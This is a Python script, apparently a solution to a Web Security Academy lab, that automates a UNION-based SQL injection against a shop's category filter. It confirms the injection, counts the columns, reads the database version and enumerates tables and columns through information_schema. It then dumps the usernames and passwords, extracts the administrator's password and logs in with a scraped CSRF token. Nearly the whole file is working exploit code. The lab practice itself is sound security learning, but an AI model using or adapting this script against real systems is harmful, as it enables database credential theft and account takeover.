import requests
from typing import Optional, Any

BASE_URL = "https://0a9d005203b9d2ff8067492c00d600ab.web-security-academy.net"
FILTER_URL = BASE_URL+"/filter"
session = requests.Session()

def send_get_request(url:str, params:dict[str, Any], timeout:int = 10) -> Optional[requests.Response]:
    try:
        return session.get(url, params=params, timeout=timeout)
    except requests.RequestException as e:
        print(f"error:{e}")
        return None

def find_columns(max_columns:int = 20) -> Optional[int]:
    for num in range(1,max_columns+1):
        payload = f"' union select {",".join(["NULL"] * num)} -- "
        response = send_get_request(FILTER_URL, {"category":payload})
        if response and response.status_code == 200:
            print(f"find columns, payload:{payload}")
            return num
        
def create_version_union(columns:int, str_idx:int ) -> Optional[str]:
    arrs = ["NULL"] * columns
    # 才發現這題是PostgreSQL 的資料庫
    arrs[str_idx] = "version()"
    return f"' union select {",".join(arrs)} -- "

        
def create_table_schema_union(columns:int, str_idx:int ) -> Optional[str]:
    arrs = ["NULL"] * columns
    arrs[str_idx] = "table_name"
    return f"' union select {",".join(arrs)} from information_schema.tables -- "
        
def create_column_schema_union(columns:int, str_idx:int, table_name:str ) -> Optional[str]:
    arrs = ["NULL"] * columns
    arrs[str_idx] = "column_name"
    return f"' union select {",".join(arrs)} from information_schema.columns where table_name='{table_name}' -- "

def extract_oracle_content_keyword(text: str, key_word: str):
    """
    從文字中抓出包含指定關鍵字的片段，
    片段範圍是從 '>' 到 '<'，並保留其中的文字。
    """
    import re
    pattern = re.compile(rf'>([^<>]*?{re.escape(key_word)}[^<>]*?)<', re.IGNORECASE)
    matches = pattern.findall(text)
    return matches

def get_admin_pw(html:str) -> Optional[dict[str, str]]:
    from bs4 import BeautifulSoup
    soup= BeautifulSoup(html,"html.parser")
    table = soup.find("table",{"class":"is-table-longdescription"})
    trs = table.findAll("tr")
    for tr in trs:
        username = tr.find("th").text.strip()
        password = tr.find("td").text.strip()

        # 如果只想抓 administrator 的那筆
        if "administrator" in username:
            print(f"username:{username}, password:{password}")
            return {"username":username, "password":password}
        

def get_csrf_token(html:str) -> Optional[str]:
    from bs4 import BeautifulSoup
    soup = BeautifulSoup(html, "html.parser")
    input_field = soup.find("input",{"name":"csrf"})
    return input_field.get("value")

def main():
    payload = "Gifts"
    response = send_get_request(FILTER_URL, {"category":payload})
    if response and response.status_code == 200:
        print(f"connect success, payload:{payload}==============")


    payload = "' or 1=1 -- "
    response = send_get_request(FILTER_URL, {"category":payload})
    if response and response.status_code == 200:
        print(f"sqli success, payload:{payload}==============")

    columns = find_columns()
    payload = create_version_union(columns, 0)
    response = send_get_request(FILTER_URL, {"category":payload})
    if response and response.status_code == 200:
        print(f"version payload:{payload}==============")
        result = extract_oracle_content_keyword(response.text,"ubuntu")
        for r in result:
            print(r)
    
    # 取得有關user的table_name
    table_names = []
    payload = create_table_schema_union(columns, 0)
    response = send_get_request(FILTER_URL, {"category":payload})
    if response and response.status_code == 200:
        print(f"table payload:{payload}==============")
        result = extract_oracle_content_keyword(response.text,"user")
        table_names = result
        for r in result:
            print(r)
    

    table_credentials_map = {}
    for table_name in table_names:
        payload = create_column_schema_union(columns, 0, table_name)
        response = send_get_request(
            FILTER_URL,
            {"category": payload}
        )
        if response and response.status_code == 200:
            print(f"column payload:{payload}==============")
            username_columns = extract_oracle_content_keyword(response.text, "username")
            pw_columns = extract_oracle_content_keyword(response.text, "password")

            if username_columns or pw_columns:
                table_credentials_map[table_name] = {
                    "username": username_columns,
                    "password": pw_columns
                }

    # 接著組出 select 語法
    admin_pw={}
    for table_name, cols in table_credentials_map.items():
        for u_col in cols["username"]:
            for p_col in cols["password"]:
                payload = f"' union SELECT {u_col}, {p_col} FROM {table_name} -- "
                print(f"password payload:{payload}=================")
                response = send_get_request(FILTER_URL, {"category":payload})
                if response and response.status_code == 200:
                    admin_pw=get_admin_pw(response.text)


    # 這裡開始用的跟lab2一樣取得csrf後登入
    csrf_token = ""
    login_url = BASE_URL+"/login"
    response = session.get(login_url, timeout=10)
    if response and response.status_code == 200:
        csrf_token = get_csrf_token(response.text)
        print(csrf_token)


    post_body={
        "csrf":csrf_token,
        "username":admin_pw.get("username"),
        "password":admin_pw.get("password")
    }

 
    try:
        response = session.post(login_url, data=post_body,timeout=10)
        if response and response.status_code == 200:
            print(response.text)
    except requests.RequestException as e:
        print(f"error:{e}")

    

        
        

if __name__ == "__main__":
    main()